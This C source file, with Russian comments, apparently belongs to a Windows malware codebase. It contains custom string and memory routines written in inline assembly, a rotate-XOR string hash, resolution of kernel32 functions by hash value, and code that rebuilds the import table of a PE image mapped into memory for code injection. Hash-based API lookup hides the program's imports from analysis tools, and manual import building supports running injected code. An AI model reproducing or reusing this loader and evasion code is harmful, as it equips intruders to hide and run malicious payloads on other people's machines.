#include <windows.h>
#include <tlhelp32.h>

#include "GetApi.h"
#include "InjectUtils.h"

int WINAPI m_isspace( char x )
{
	return ( x == ' ' );
}


int WINAPI  m_isdigit( char x )
{
	return ( ( x >= '0' ) && ( x <= '9' ) );
}


long WINAPI m_atol( const char *nptr )
{
	if ( !nptr )
		return 0;

	int c;              
	long total;         
	int sign;           
	
	while ( m_isspace( (int)(unsigned char)*nptr ) )
	{
		++nptr;
	}
	
	c = (int)(unsigned char)*nptr++;

	sign = c;

	if ( c == '-' || c == '+' )
	{
		c = (int)(unsigned char)*nptr++;
	}
	
	total = 0;
	
	while ( m_isdigit( c ) )
	{
		total = 10 * total + ( c - '0' );     
		c = (int)(unsigned char)*nptr++;    
	}
	
	if ( sign == '-' )
	{
		return -total;
	}
	else
	{
		return total;   
	}
}


int m_atoi( const char *nptr )
{
	return (int)m_atol(nptr);
}


DWORD CalcHash(char *Str )
{
	if (!Str ) return -1;

	DWORD dwHash = 0;
	char *CopyStr = Str;

	while ( *CopyStr != 0)
	{
		dwHash = (( dwHash << 7 ) & (DWORD)( -1 ) ) | ( dwHash >> ( 32 - 7 ));
		dwHash = dwHash ^ ( *CopyStr );
		CopyStr++;
	}

	return dwHash;
}

DWORD CalcHashW( PWSTR str )
{
	if ( !str )
	{
		return 0;
	}

    DWORD hash = 0;
    PWSTR s = str;

    while (*s) 
    {
        hash = ((hash << 7) & (DWORD)-1) | (hash >> (32 - 7));
        hash = hash ^ *s;
        s++;
    }

    return hash;
}

wchar_t *m_wcsncpy( wchar_t *dest, wchar_t *src, unsigned long n )
{
	if ( !dest || !src )
	{
		return NULL;
	}

	for ( ULONG i = 0; i < n; i++ ) 
    {
	   dest[i] = src[i];
    }

    return dest;
}


DWORD WINAPI m_lstrcmp( const char *szStr1, const char *szStr2 )
{
	if (szStr1 == NULL || szStr2 == NULL)
	{
		return -1;
	}

	DWORD dwReturn;

	__asm
	{
		pushad
		mov		esi,[szStr1]
		mov		edi,[szStr2]
	__copy:
		cmp byte ptr [esi],0
		jz		__true
		cmpsb
		jz		__copy
	__false:
		xor		eax,eax
		inc		eax
		jmp		__to_exit
	__true:
		cmp byte ptr [edi],0
		jnz		__false	
		xor		eax,eax
	__to_exit:
		mov		[dwReturn],eax
		popad
	} 
	
	return dwReturn;
}


void WINAPI m_lstrcat( char *szBuf, const char *szStr )
{
	if ( !szBuf || !szStr )
	{
		return;
	}

	__asm
	{
		pushad
		mov		esi,[szBuf]
	__again:
		lodsb
		test	al,al
		jnz		__again

		dec		esi
		xchg	esi,edi
		mov		esi,[szStr]
	__copy:
		lodsb
		test	al,al
		stosb
		jnz		__copy
		popad
	} 
} 


wchar_t *m_wcslwr( wchar_t *Str )
{
	if ( !Str )
	{
		return NULL;
	}

    wchar_t *Pos = Str;

    for ( ; Str <= ( Pos + m_wcslen( Pos ) ); Str++ )
    {		
        if ( ( *Str >= 'A' ) && ( *Str <= 'Z' ) ) 
		{
			*Str = *Str + ('a'-'A');
		}
    }

    return Pos;
}

void *m_memset( void *szBuffer, DWORD dwSym, DWORD dwLen )
{
	if ( !szBuffer )
		return NULL;

	__asm
	{
		pushad
		mov		edi,[szBuffer]
		mov		ecx,[dwLen]
		mov		eax,[dwSym]
		rep		stosb
		popad
	} 

	return NULL;
} 

void *m_memcpy( void *szBuf, const void *szStr, int nLen )
{
	if ( !szBuf || !szStr || nLen <= 0 )
		return NULL;

	__asm
	{
		pushad
		mov		esi,[szStr]
		mov		edi,[szBuf]
		mov		ecx,[nLen]
		rep		movsb
		popad
	}

	return NULL;
}

PCHAR STR::Scan(PCHAR Str, char C)
{
	// Функция возвращает указатель на символ С;
	if (Str == NULL)
		return NULL;
	PCHAR Tmp = Str;
	while (*Tmp != C && *Tmp != 0) Tmp++;
	if (*Tmp == 0 && C != 0)
		Tmp = NULL;
	return Tmp;
}

bool STR::IsEmpty(PCHAR Str)
{
	// Функция возвращает истину если на входе нулевой указатель либо
	// пустая строка
	return (Str == NULL || *Str == 0);
}

DWORD GetMemSize( LPVOID lpAddr )
{
	if ( !lpAddr )
	{
		return 0;
	}

	MEMORY_BASIC_INFORMATION MemInfo;

	pVirtualQuery( lpAddr, &MemInfo, sizeof( MEMORY_BASIC_INFORMATION ) );

	return MemInfo.RegionSize;
}


VOID MemFree( LPVOID lpAddr )
{
	if ( lpAddr != NULL )
		pVirtualFree( lpAddr, 0, MEM_RELEASE );
}


LPVOID MemAlloc( DWORD dwSize )
{
	return pVirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
}

LPVOID MemAllocAndClear(DWORD Size)
{
	// Выделить и очистить память указанного размера
	if (Size == 0)
    	return NULL;

	void* Memory = pVirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	m_memset(Memory, 0, Size);

	//if (Memory != NULL)
	//{
 //   	DWORD Symbol = 0;
	//	__asm
	//	{
	//		pushad
	//		mov		edi, [Memory]
	//		mov		ecx, [Size]
	//		mov		eax, [Symbol]
	//		rep		stosb
	//		popad
	//	}
 //   }

	return Memory;
}



LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize )
{
    // Изменяем размер выделенного буфера памяти
	DWORD PrevLen = 0;

	// Определяем размер предыдущего блока
	if ( lpAddr )
		PrevLen = GetMemSize(lpAddr);

	//  Создаём новый буфер
	LPVOID NewAddr = NULL;
	if (dwSize > 0)
	{
		NewAddr = MemAlloc(dwSize);
		if (lpAddr && NewAddr && PrevLen)
		{
            // Копируем старую память
			if (dwSize < PrevLen)
            	PrevLen = dwSize;
			m_memcpy(NewAddr, lpAddr, PrevLen);
		}
	}

	if (lpAddr != NULL)
		MemFree(lpAddr);

	return NewAddr;
}

//-----------------------------------------------------------------------------

LPVOID HEAP::Alloc(DWORD Size)
{
	if (Size == 0) return NULL;

	LPVOID Buf = 0;
	HANDLE Heap = pGetProcessHeap();
	if (Heap != NULL)
	{
		Buf = pHeapAlloc(Heap, 0, Size);
      m_memset(Buf, 0, Size);
    }
	return Buf;
}

LPVOID HEAP::ReAlloc(LPVOID Buf, DWORD Size)
{
	// Переопределяем блок памяти

	if (Buf == NULL)
		return HEAP::Alloc(Size);

    LPVOID Res = NULL;
	HANDLE Heap = pGetProcessHeap();
	if (Heap != NULL)
	{
		Res = pHeapReAlloc(Heap, 0, Buf, Size);
	}
	return Res;
}

bool HEAP::ReAlloc2(LPVOID &Buf, DWORD Size)
{
	LPVOID NewBuf = HEAP::ReAlloc(Buf, Size);
	if (NewBuf != NULL)
	{
		Buf = NewBuf;
		return true;
	}
	else
		return false;
}


void HEAP::Free(LPVOID Buf)
{
	// Освобождаем выделенную память

	if (Buf == NULL) return;

	HANDLE Heap = pGetProcessHeap();
	if (Heap != NULL)
		BOOL V = (BOOL)pHeapFree(Heap, 0, Buf);
}

void HEAP::Free2(LPVOID &Buf)
{
	// Освободить память и обнулить переменную
	if (Buf != NULL)
	{
		HEAP::Free(Buf);
		Buf = NULL;
	}
}

DWORD HEAP::Size(LPVOID Buf)
{
	if (Buf == NULL) return 0;

	HANDLE Heap = pGetProcessHeap();

	if (Heap != NULL)
	{
		int S = (int)pHeapSize(Heap, 0, Buf);
		if (S < 0) S = 0;
        return S;
	}
	else
		return 0;
}

DWORD WINAPI m_wcslen( const wchar_t *String )
{
	if ( !String )
	{
		return 0;
	}

	wchar_t* p = (wchar_t *)String;

	for( ; *p != 0; )
	{
		p++;
	}

	return p - String;
}

#define GET_HEADER_DICTIONARY( module, idx ) &(module)->headers->OptionalHeader.DataDirectory[idx]

int BuildImportTable(PMEMORYMODULE module)
{
	int result=1;
	unsigned char *codeBase = module->codeBase;
	HMODULE kernel32 ;
	PVOID (WINAPI*_pGetProcAddress)(HMODULE,PCHAR) ;
	PVOID (WINAPI*_pLoadLibraryA)(PCHAR) ;
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);

  

	if ( directory->Size <= 0 )
		return 0;

	if ( (kernel32 = GetKernel32()) == NULL)
		return 0;

	_pGetProcAddress = ( PVOID (WINAPI*)(HMODULE,PCHAR) ) GetApiAddr(kernel32,0x1FC0EAEE);
	_pLoadLibraryA = ( PVOID (WINAPI*)(PCHAR) ) GetApiAddr(kernel32,0xC8AC8026);
	if ( (_pGetProcAddress == NULL) | (_pLoadLibraryA == NULL) )
		return 0;

  //__asm int 3

  PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);

	for ( ; importDesc->Name; importDesc++ )
	{
		DWORD *thunkRef, *funcRef;
		HMODULE handle = (HMODULE)_pLoadLibraryA( (PCHAR)(codeBase + importDesc->Name) );

		if (handle == NULL)
		{
			//	not found dll
			continue;
		}

		HMODULE *p = (HMODULE*)MemRealloc( module->modules, (module->numModules+1)*(sizeof(HMODULE)) );
		module->modules = p;

		if (module->modules == NULL)
		{
			result = 0;
			break;
		}

    //

		module->modules[module->numModules++] = handle;

		if (importDesc->OriginalFirstThunk)
		{
			thunkRef = (DWORD *)(codeBase + importDesc->OriginalFirstThunk);
			funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
		} else {
			thunkRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
		}
		for (; *thunkRef; thunkRef++, funcRef++)
		{
			if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
			{
				DWORD Addr;
				if ( Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)IMAGE_ORDINAL(*thunkRef) ) )
				{
					if ( Addr != *funcRef)
						*funcRef = Addr;
				}
				else
				{
					// not found funtion. call by ordinal
				}
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
				DWORD Addr;
				if (  Addr = (DWORD)_pGetProcAddress( handle, (PCHAR)&thunkData->Name ))
				{
					if ( Addr != *funcRef)
						*funcRef = Addr;
				}
			}
			if (*funcRef == 0)
			{
				// not found function. call by name
			}
		}
	}

  //__asm int 3

	return result;
}


#pragma optimize("", off)
bool BuildImport(PVOID ImageBase)
{
	MEMORYMODULE result;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS old_header;

	dos_header = (PIMAGE_DOS_HEADER)ImageBase;

	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(ImageBase))[dos_header->e_lfanew];

	ClearStruct(result);
	result.codeBase = (unsigned char*)ImageBase;
	result.headers = old_header;


	if (!BuildImportTable(&result))
		return false;

//	result.initialized = 1;

	return true;
};
#pragma optimize("", on)





